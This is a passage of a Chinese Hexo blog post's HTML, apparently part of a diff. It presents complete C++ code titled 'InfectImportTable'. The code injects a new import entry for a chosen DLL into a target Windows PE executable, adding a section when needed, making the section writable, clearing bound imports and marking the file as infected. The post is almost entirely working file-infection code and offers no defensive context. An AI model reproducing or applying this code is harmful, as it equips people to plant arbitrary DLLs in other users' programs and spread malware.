class="hljs-number">0</span>;<br>	<span class="hljs-keyword">if</span> (FileOffset &lt; m_ImageOptionalHeader-&gt;SizeOfHeaders)<br>	&#123;<br>		RVA = FileOffset;<br>		<span class="hljs-keyword">return</span> RVA;<br>	&#125;<br>	PIMAGE_SECTION_HEADER ImageSectionHeader = <span class="hljs-built_in">LocateSectionByFileOffset</span>(FileOffset);<br>	<span class="hljs-keyword">if</span> (ImageSectionHeader != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>		RVA = FileOffset - ImageSectionHeader-&gt;PointerToRawData + ImageSectionHeader-&gt;VirtualAddress;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> RVA;<br>&#125;<br><span class="hljs-function">DWORD <span class="hljs-title">_CPEImage::Rva2Raw</span><span class="hljs-params">(DWORD Rva)</span></span><br><span class="hljs-function"></span>&#123;<br>	DWORD FileOffset = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">if</span> (Rva &lt; m_ImageOptionalHeader-&gt;SizeOfHeaders)<br>	&#123;<br>		FileOffset = Rva;<br>		<span class="hljs-keyword">return</span> FileOffset;<br>	&#125;<br>	PIMAGE_SECTION_HEADER ImageSectionHeader = <span class="hljs-built_in">LocateSectionByRva</span>(Rva);<br>	<span class="hljs-keyword">if</span> (ImageSectionHeader != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>		FileOffset = Rva - ImageSectionHeader-&gt;VirtualAddress + ImageSectionHeader-&gt;PointerToRawData;<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> FileOffset;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>3)InfectImportTable</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;_CPEImage.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFECT_SIGNATURE (<span class="hljs-string">&#x27;PE&#x27;</span>)</span><br><br><span class="hljs-function">BOOL <span class="hljs-title">InfectImportTable</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">	IN <span class="hljs-type">const</span> TCHAR *ImageFilePath,</span></span><br><span class="hljs-params"><span class="hljs-function">	IN <span class="hljs-type">const</span> CHAR *DllName,</span></span><br><span class="hljs-params"><span class="hljs-function">	IN <span class="hljs-type">const</span> CHAR *FunctionName)</span></span>;<br><span class="hljs-type">void</span> _tmain()<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br>	<span class="hljs-built_in">InfectImportTable</span>(_T(<span class="hljs-string">&quot;Demo.exe&quot;</span>), (<span class="hljs-string">&quot;Dll.dll&quot;</span>), (<span class="hljs-string">&quot;HelloWorld&quot;</span>));<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>	<span class="hljs-built_in">InfectImportTable</span>(_T(<span class="hljs-string">&quot;Demo.exe&quot;</span>), (<span class="hljs-string">&quot;Dll.dll&quot;</span>), (<span class="hljs-string">&quot;HelloWorld&quot;</span>));<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">InfectImportTable</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">	IN <span class="hljs-type">const</span> TCHAR *ImageFilePath,</span></span><br><span class="hljs-params"><span class="hljs-function">	IN <span class="hljs-type">const</span> CHAR *DllName,</span></span><br><span class="hljs-params"><span class="hljs-function">	IN <span class="hljs-type">const</span> CHAR *FunctionName)</span></span><br><span class="hljs-function"></span>&#123;<br><br>	BOOL IsOk = FALSE;<br>	WORD i = <span class="hljs-number">0</span>;<br>	DWORD NumberOfBytesWritten = <span class="hljs-number">0</span>;<br>	PIMAGE_SECTION_HEADER ImageSectionHeader, NewImageSectionHeader = <span class="hljs-literal">NULL</span>, TargetImageSectionHeader = <span class="hljs-literal">NULL</span>;<br>	DWORD OldImportDataCount = <span class="hljs-number">0</span>, NewImportDataCount = <span class="hljs-number">0</span>;<br>	DWORD OldImportDataSize = <span class="hljs-number">0</span>, NewImportDataSize = <span class="hljs-number">0</span>;<br>	DWORD v5 = <span class="hljs-number">0</span>;              <span class="hljs-comment">//新导入表数组的存储位置</span><br>	DWORD NewThunkDataSize = <span class="hljs-number">0</span>; <br>	DWORD NewThunkDataVA = <span class="hljs-number">0</span>;<span class="hljs-comment">//新导入项的ThunkData的存储位置</span><br>	DWORD SizeNeed = <span class="hljs-number">0</span>;<br>	DWORD v2 = <span class="hljs-number">0</span>;<br>	BOOL IsUseNewSection = FALSE; <span class="hljs-comment">//是否使用了新节</span><br>	BOOL IsPlaceThunkDataToOldIID = TRUE; <span class="hljs-comment">//表明ThunkData存放的位置是不是在原来的IID位置，如果放不下，得找新位置</span><br><br>	_CPEImage v1;<br>	<br>	<span class="hljs-comment">//获得被感染PE文件文件句柄</span><br>	HANDLE FileHandle = <span class="hljs-built_in">CreateFile</span>(ImageFilePath,<br>		GENERIC_READ | GENERIC_WRITE,<br>		FILE_SHARE_READ,<br>		<span class="hljs-literal">NULL</span>,<br>		OPEN_EXISTING,<br>		FILE_ATTRIBUTE_NORMAL,<br>		<span class="hljs-literal">NULL</span>);<br><br>	<span class="hljs-comment">//解析PE结构</span><br>	PBYTE BufferData = v1.<span class="hljs-built_in">LoadImage</span>(FileHandle, FALSE, <span class="hljs-number">0</span>, FALSE);<br><br><br>	<span class="hljs-keyword">if</span> (BufferData == <span class="hljs-literal">NULL</span>)<br>	&#123;<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br><br>	<span class="hljs-comment">//检查是否被感染过</span><br>	<span class="hljs-keyword">if</span> (v1.m_ImageDosHeader-&gt;e_csum == INFECT_SIGNATURE)<br>	&#123;<br>		_tprintf(_T(<span class="hljs-string">&quot;文件已经被感染过!\n&quot;</span>));<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br><br>	<span class="hljs-comment">//计算PE文件的节中是否存在空隙</span><br><br>	OldImportDataSize = v1.m_ImportDataTable-&gt;Size;<br>	OldImportDataCount = OldImportDataSize / <span class="hljs-built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR);  <span class="hljs-comment">//获取导入表描述的个数</span><br>	<br>	<br>	NewImportDataCount = OldImportDataCount + <span class="hljs-number">1</span>;<br>	NewImportDataSize = NewImportDataCount * <span class="hljs-built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR);  <br><br>	SizeNeed = NewImportDataSize; <span class="hljs-comment">//所需的大小是新导入表IID结构的大小</span><br><br><br><br>	ImageSectionHeader = v1.<span class="hljs-built_in">LocateSectionByRva</span>(v1.m_ImportDataTable-&gt;VirtualAddress);   <span class="hljs-comment">//导入表在哪个节中</span><br><br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	typedef struct _IMAGE_SECTION_HEADER &#123;</span><br><span class="hljs-comment">	BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="hljs-comment">	union &#123;</span><br><span class="hljs-comment">			DWORD   PhysicalAddress;</span><br><span class="hljs-comment">			DWORD   VirtualSize;     //节中数据的真实大小</span><br><span class="hljs-comment">	&#125; Misc;</span><br><span class="hljs-comment">	DWORD   VirtualAddress;</span><br><span class="hljs-comment">	DWORD   SizeOfRawData;           //文件粒度对齐后的大小</span><br><span class="hljs-comment">	DWORD   PointerToRawData;</span><br><span class="hljs-comment">	DWORD   PointerToRelocations;</span><br><span class="hljs-comment">	DWORD   PointerToLinenumbers;</span><br><span class="hljs-comment">	WORD    NumberOfRelocations;</span><br><span class="hljs-comment">	WORD    NumberOfLinenumbers;</span><br><span class="hljs-comment">	DWORD   Characteristics;</span><br><span class="hljs-comment">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER</span><br><span class="hljs-comment">	</span><br><span class="hljs-comment">	</span><br><span class="hljs-comment">	*/</span><br><br><br><br><br>	DWORD PaddingSize = v1.<span class="hljs-built_in">GetSectionPhysialPaddingSize</span>(ImageSectionHeader);  <span class="hljs-comment">//空隙大小</span><br><br>	<span class="hljs-comment">//计算填充ThunkData需要的大小，它包括了OriginalFirstThunk、FirstThunk、IMPORT_BY_NAME，以及DllName</span><br>	NewThunkDataSize = <span class="hljs-built_in">sizeof</span>(ULONG_PTR) * <span class="hljs-number">4</span> + <span class="hljs-built_in">strlen</span>(DllName) + <span class="hljs-number">1</span> + <span class="hljs-built_in">sizeof</span>(WORD) + <span class="hljs-built_in">strlen</span>(FunctionName) + <span class="hljs-number">1</span>;<br>	<br>	NewThunkDataSize = <span class="hljs-built_in">ALIGN_SIZE_UP</span>(NewThunkDataSize, <span class="hljs-built_in">sizeof</span>(ULONG)); <span class="hljs-comment">//对齐</span><br>	<span class="hljs-comment">//判断原导入表位置能否写下新的ThunkData</span><br>	<br>	<span class="hljs-keyword">if</span> (NewThunkDataSize &gt; OldImportDataSize)<br>	&#123;<br>		<span class="hljs-comment">//写不下,那么在寻找节隙时就要加上</span><br>		<span class="hljs-comment">//按ULONG_PTR对齐之后再添加ThunkData，虽然不按这个对齐也可以</span><br>		v2 = <span class="hljs-built_in">ALIGN_SIZE_UP</span>(NewImportDataSize, <span class="hljs-built_in">sizeof</span>(ULONG_PTR));<br>		SizeNeed = v2 + NewThunkDataSize;<br>		IsPlaceThunkDataToOldIID = FALSE;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (PaddingSize &gt;= SizeNeed)<br>	&#123;<br>		_tprintf(_T(<span class="hljs-string">&quot;节空隙可以放下新的导入表，不需添加新节!\n&quot;</span>));<br>		v5 = ImageSectionHeader-&gt;VirtualAddress + v1.<span class="hljs-built_in">GetAlignedSize</span>(ImageSectionHeader-&gt;Misc.VirtualSize, <span class="hljs-built_in">sizeof</span>(DWORD));<br>		TargetImageSectionHeader = ImageSectionHeader;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		_tprintf(_T(<span class="hljs-string">&quot;节空隙不能放下新的导入表，需要添加新节!\n&quot;</span>));<br>		<span class="hljs-comment">//根据所需的空间大小添加一个新节</span><br>		NewImageSectionHeader = v1.<span class="hljs-built_in">AddNewSectionToFile</span>(<span class="hljs-string">&quot;.Patch&quot;</span>, SizeNeed);<br>		_tprintf(_T(<span class="hljs-string">&quot;新节添加完毕! VA = 0x%p  PointerToRawData = 0x%p  SizeOfRawData = 0x%p\n&quot;</span>,<br>			NewImageSectionHeader-&gt;VirtualAddress, NewImageSectionHeader-&gt;PointerToRawData, NewImageSectionHeader-&gt;SizeOfRawData));<br>		v5 = NewImageSectionHeader-&gt;VirtualAddress;<br>		TargetImageSectionHeader = NewImageSectionHeader;<br>		IsUseNewSection = TRUE;<br>	&#125;<br><br>	<span class="hljs-comment">//保存原导入表</span><br>	PIMAGE_IMPORT_DESCRIPTOR OldImageImportDescriptor = v1.m_ImageImportDescriptor;<br>	PIMAGE_IMPORT_DESCRIPTOR v10 = (PIMAGE_IMPORT_DESCRIPTOR)<span class="hljs-built_in">malloc</span>(SizeNeed);<br>	<span class="hljs-built_in">ZeroMemory</span>(v10, SizeNeed);<br>	<span class="hljs-comment">//保存原来的导入表部分到新的中</span><br>	<span class="hljs-built_in">memcpy</span>(v10, OldImageImportDescriptor, OldImportDataSize);<br><br><br>	PIMAGE_IMPORT_DESCRIPTOR NewImageImportDescriptor = v10 + OldImportDataCount - <span class="hljs-number">1</span>;<br><br><br>	<span class="hljs-comment">//需要注意的是，ThunkData在32位和64位下的长度是不一样的，所以这里定义为自适应的ULONG_PTR</span><br>	PULONG_PTR OriginalFirstThunk = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">if</span> (IsPlaceThunkDataToOldIID)<br>	&#123;<br>		<br>		OriginalFirstThunk = (PULONG_PTR)(v1.m_ModuleHandle + v1.m_ImportDataTable-&gt;VirtualAddress);<br>		NewThunkDataVA = v1.m_ImportDataTable-&gt;VirtualAddress;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>	<br>		OriginalFirstThunk = (PULONG_PTR)((PBYTE)NewImageImportDescriptor + v2);<br>		NewThunkDataVA = v5 + v2; <br>	&#125;<br>	<span class="hljs-built_in">ZeroMemory</span>(OriginalFirstThunk, NewThunkDataSize);<br>	<br>	<br>	<span class="hljs-comment">//留出两项内容，第一项稍后填充，第二项填0作为结束标记</span><br>	PULONG_PTR FirstThunk = OriginalFirstThunk + <span class="hljs-number">2</span>;<br>	<span class="hljs-comment">//留出两项内容,第一项稍后填充，第二项填0作为结束标记，之后作为Dll名称</span><br>	PCHAR  v11 = (PCHAR)(FirstThunk + <span class="hljs-number">2</span>);<br>	<span class="hljs-comment">//保存dll名称</span><br>	<span class="hljs-built_in">strcpy</span>(v11,DllName);<br><br>	SIZE_T v12 = <span class="hljs-built_in">strlen</span>(DllName);<br>	v11[v12] = <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">//接下来作为一个PIMPORT_BY_NAME结构</span><br>	PIMAGE_IMPORT_BY_NAME ImageImportByName = (PIMAGE_IMPORT_BY_NAME)(v11 + v12 + <span class="hljs-number">1</span>);<br>	<span class="hljs-comment">//填充它</span><br>	ImageImportByName-&gt;Hint = <span class="hljs-number">0</span>;<br>	<span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span>*)ImageImportByName-&gt;Name, FunctionName);<br><br><br>	<span class="hljs-comment">//计算结束位置</span><br>	PCHAR End = (PCHAR)ImageImportByName + <span class="hljs-built_in">sizeof</span>(ImageImportByName-&gt;Hint) + <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span>*)ImageImportByName-&gt;Name) + <span class="hljs-number">1</span>;<br>	<span class="hljs-comment">//计算总占用的空间大小</span><br>	DWORD NewEntrySize = (DWORD)End - (DWORD)OriginalFirstThunk;<br><br>	<span class="hljs-comment">//返过来填充OriginalFirstThunk和FirstThunk</span><br>	<span class="hljs-comment">//根据定义，OriginalFirst应指向IMAGE_IMPORT_BY_NAME结构的偏移</span><br>	OriginalFirstThunk[<span class="hljs-number">0</span>] = NewThunkDataVA + ((PBYTE)ImageImportByName - (PBYTE)OriginalFirstThunk);<br>	FirstThunk[<span class="hljs-number">0</span>] = OriginalFirstThunk[<span class="hljs-number">0</span>];<br><br><br>	NewImageImportDescriptor-&gt;OriginalFirstThunk = NewThunkDataVA;<br>	NewImageImportDescriptor-&gt;Name = NewThunkDataVA + <span class="hljs-built_in">sizeof</span>(ULONG_PTR) * <span class="hljs-number">4</span>;<span class="hljs-comment">//OriginalFirstThunk + FirstThunk的大小</span><br>	NewImageImportDescriptor-&gt;FirstThunk = NewThunkDataVA + <span class="hljs-built_in">sizeof</span>(ULONG_PTR) * <span class="hljs-number">2</span>;<br><br><br>	<span class="hljs-comment">//更新PE头中的几个值</span><br>	<span class="hljs-comment">//新的导入表大小</span><br>	v1.m_ImportDataTable-&gt;Size = NewImportDataSize;<br>	<span class="hljs-comment">//新的导入表IID的起始偏移</span><br>	v1.m_ImportDataTable-&gt;VirtualAddress = v5;<br>	<span class="hljs-keyword">if</span> (!IsUseNewSection)<br>	&#123;<br>		ImageSectionHeader-&gt;Misc.VirtualSize += SizeNeed;   <span class="hljs-comment">//缝隙添加</span><br>	&#125;<br><br>	<span class="hljs-comment">//如果ThunkData放在了原IID的位置，需要设置节为可写的</span><br>	ImageSectionHeader-&gt;Characteristics |= IMAGE_SCN_MEM_WRITE;<br>	<br>	<br>	<span class="hljs-comment">//清空绑定输入表,强迫加载器重新加载IAT</span><br>	v1.m_ImageOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = <span class="hljs-number">0</span>;<br>	v1.m_ImageOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = <span class="hljs-number">0</span>;<br>	<br>	<span class="hljs-comment">//设置感染标记</span><br>	v1.m_ImageDosHeader-&gt;e_csum = INFECT_SIGNATURE;<br><br><br>	<span class="hljs-comment">//写入文件</span><br><br><br>	<span class="hljs-comment">//开始保存内存中的修改内容到文件中</span><br>	<span class="hljs-comment">//先写入新的PE头</span><br>	DWORD FileOffset = <span class="hljs-number">0</span>;<br>	ULONG_PTR VAInMemory = <span class="hljs-number">0</span>;<br>	<span class="hljs-built_in">SetFilePointer</span>(FileHandle, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, FILE_BEGIN);<br>	IsOk = <span class="hljs-built_in">WriteFile</span>(FileHandle, v1.m_ModuleHandle, v1.m_ImageOptionalHeader-&gt;SizeOfHeaders, &amp;NumberOfBytesWritten, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span> (!IsOk)<br>	&#123;<br>	<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br><br><br><br>	<span class="hljs-comment">//写入新IID的子结构信息,位置在原导入表的开始处</span><br>	VAInMemory = NewThunkDataVA;<br>	FileOffset = v1.<span class="hljs-built_in">Rva2Raw</span>(VAInMemory);<br>	<span class="hljs-built_in">SetFilePointer</span>(FileHandle, FileOffset, <span class="hljs-literal">NULL</span>, FILE_BEGIN);<br>	IsOk = <span class="hljs-built_in">WriteFile</span>(FileHandle, OriginalFirstThunk, NewEntrySize, &amp;NumberOfBytesWritten, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span> (!IsOk)<br>	&#123;<br>	<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br><br>	<span class="hljs-comment">//写入新的IID结构</span><br>	VAInMemory = (ULONG_PTR)v1.m_ImportDataTable-&gt;VirtualAddress;<br>	FileOffset = v1.<span class="hljs-built_in">Rva2Raw</span>(VAInMemory);<br>	<span class="hljs-built_in">SetFilePointer</span>(FileHandle, FileOffset, <span class="hljs-literal">NULL</span>, FILE_BEGIN);<br>	IsOk = <span class="hljs-built_in">WriteFile</span>(FileHandle, v10, NewImportDataSize, &amp;NumberOfBytesWritten, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span> (!IsOk)<br>	&#123;<br>		<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br>	<span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/project/categories/PE%E6%84%9F%E6%9F%93/" class="category-chain-item">PE感染</a>
+  
+  
+    <span>></span>
+    
+  <a href="/project/categories/PE%E6%84%9F%E6%9F%93/%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%84%9F%E6%9F%93/" class="category-chain-item">导入表感染</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/project/tags/%E6%84%9F%E6%9F%93/">#感染</a>
+      
+        <a href="/project/tags/PE/">#PE</a>
+      
+        <a href="/project/tags/%E5%AF%BC%E5%85%A5/">#导入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>InfectImportTable</div>
+      <div>https://wlpswmt.github.io/project/2023/02/03/InfectImportTable/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sivan Zhang</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年2月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/project/2023/03/06/Scrapy%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/" title="Scrapy快速入门">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Scrapy快速入门</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/project/2023/01/29/HookDbg/" title="HookDbg">
+                        <span class="hidden-mobile">HookDbg</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
